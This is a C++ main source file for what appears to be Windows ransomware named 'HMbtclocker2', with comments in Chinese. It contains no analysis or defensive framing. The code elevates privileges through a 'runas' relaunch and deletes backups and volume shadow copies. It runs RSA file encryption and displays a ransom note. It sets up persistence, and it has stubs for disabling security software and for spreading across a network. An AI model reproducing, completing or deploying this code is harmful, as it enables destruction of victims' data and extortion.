#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#define NOMINMAX
#include <windows.h>
#include <lm.h>       // 用于 NetGetJoinInformation
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <future>
#include <iostream>
#include <string>
#include<stdio.h>
#include"crypt.h"
#include"start.h"
#include"Message.h"
#include"tool.h"
#include"beadmin.h"
#include"rsa.h"
#include"networkscan.h"
#include"deletfile.h"
//#include"cheat.h"
//#include"networkscan.cpp"
//#include"antihook.h"
//#include"vbs.h"
//#include"beadmin2.h"
#pragma comment(lib, "netapi32.lib") // 链接 NetAPI32.lib
#pragma comment(lib, "advapi32.lib") // 用于权限管理相关函数

namespace fs = std::filesystem;

// ==================== 全局控制 ====================
std::atomic<bool> g_adminMode{ false };
std::atomic<bool> g_shouldExit{ false };
std::mutex g_consoleMutex;

// ==================== 权限管理 ====================
class PrivilegeManager {
public:
    static bool IsRunningAsAdmin() {
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;

        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        bool isElevated = false;

        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
            isElevated = elevation.TokenIsElevated;

        CloseHandle(hToken);
        return isElevated;
    }

    static bool RunAsAdmin() {
        wchar_t szPath[MAX_PATH];
        if (GetModuleFileNameW(NULL, szPath, MAX_PATH) == 0)
            return false;

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;

        return ShellExecuteExW(&sei);
    }

    static bool ShouldExitForHigherPrivilege() {
        // 检查是否已有管理员实例运行
        HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\HMbtclocker2_AdminInstance");
        DWORD dwError = GetLastError();

        if (dwError == ERROR_ALREADY_EXISTS) {
            CloseHandle(hMutex);
            return true;
        }

        return false;
    }
};

// ==================== 功能执行器 ====================
class FunctionExecutor {
public:
    // 管理员模式功能
    static void RunAdminCoreFunctions() {
        std::vector<std::future<void>> tasks;

        // 删除备份和卷影
        tasks.push_back(std::async(std::launch::async, [] {
          //  inject();
             deletV(); // 确保函数名正确
            }));

        // 关闭安全软件
        tasks.push_back(std::async(std::launch::async, [] {
            // defencedd(); // 确保函数名正确
            }));

        // 高级传播
        tasks.push_back(std::async(std::launch::async, [] {
            // spread(); // 确保函数名正确
            }));

        // 文件加密
        tasks.push_back(std::async(std::launch::async, [] {
            // encrypthf(); // 确保函数名正确
            }));

        // 勒索信息
        tasks.push_back(std::async(std::launch::async, [] {
            // showtext(); // 确保函数名正确
            }));

        // 等待所有任务完成
        for (auto& task : tasks) {
            try {
                task.wait();
            }
            catch (const std::exception& e) {
                std::lock_guard<std::mutex> lock(g_consoleMutex);
                std::cerr << "[ERROR] Exception in task: " << e.what() << std::endl;
            }
        }
    }

    // 降级模式功能
    static void RunLimitedUserFunctions() {
        std::vector<std::future<void>> tasks;
       // inject();
        // 显示警告
        MessageBoxW(NULL,
            L"管理员权限获取失败，正在降级运行基础功能",
            L"权限警告",
            MB_ICONWARNING | MB_OK);

        // 基本传播
        tasks.push_back(std::async(std::launch::async, [] {
            //spread(); // 确保函数名正确
            }));

        // 文件加密（跳过系统文件）
        tasks.push_back(std::async(std::launch::async, [] {
            rsaencrypt(); // 确保函数名正确
            }));

        // 勒索信息
        tasks.push_back(std::async(std::launch::async, [] {
            showtext(); // 确保函数名正确
            }));

        // 创建持久化项目
        tasks.push_back(std::async(std::launch::async, [] {
            startself(); // 确保函数名正确
            }));

        // 等待所有任务完成
        for (auto& task : tasks) {
            try {
                task.wait();
            }
            catch (const std::exception& e) {
                std::lock_guard<std::mutex> lock(g_consoleMutex);
                std::cerr << "[ERROR] Exception in task: " << e.what() << std::endl;
            }
        }
    }
};

// ==================== 定时检测器 ====================

// ==================== 主程序 ====================
int main() {
    // 隐藏控制台窗口
   // AntiHook_RemoveAllHooks();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
    //  mainfunction();
      //vbs();
   // inject();
    //mainc();
   //int result = admin();
    encrypthf();
    //network_scanner::StartScan(true);
    rsaencrypt();    // 启动定时任务
    //TimedFunctionRunner timer;
    // 根据权限级别执行核心功能
    if (g_adminMode) {
        std::lock_guard<std::mutex> lock(g_consoleMutex);
        std::cout << "Running in ADMIN mode" << std::endl;
        FunctionExecutor::RunAdminCoreFunctions();
    }
    else {
        std::lock_guard<std::mutex> lock(g_consoleMutex);
        std::cout << "Running in LIMITED USER mode" << std::endl;
        FunctionExecutor::RunLimitedUserFunctions();
    }

    // 清理和退出


    return 0;
}